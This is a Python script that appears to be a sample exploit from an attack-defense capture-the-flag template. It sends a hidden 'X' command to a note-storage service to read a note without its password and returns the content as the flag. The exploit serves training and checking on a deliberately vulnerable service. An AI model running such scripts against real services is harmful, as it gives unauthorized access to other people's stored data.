import socket
import sys
import pexpect
import pexpect.fdpexpect

def exploit(ip, port, flag_id):
    # We read that note, but we don't know the password.
    # (Basically, get_flag without the "token".)
    # This is what players must prevent!
    note_id = flag_id

    # Interaction with the service
    # Try to be robust, services will not always answer immediately
    if ip:
        conn = socket.create_connection((ip,port))
        c = pexpect.fdpexpect.fdspawn(conn.fileno())
    else:
        # Makes it easier to test locally
        c = pexpect.spawn("../service/ro/sample_c")
        c.logfile = sys.stdout

    c.expect("Hi! Welcome to our note storage service")
    c.expect("Want to \(R\)ead or \(W\)rite a note?") # Note: these are RegExps!

    c.sendline("X")

    c.expect("Which note?")
    c.sendline("{}".format(note_id))

    c.expect("Note content: ")
    content = c.readline().strip()
    c.close()
    if ip: conn.close()

    return { 'FLAG': content }


if __name__ == "__main__":
    print exploit(None, None, sys.argv[1])
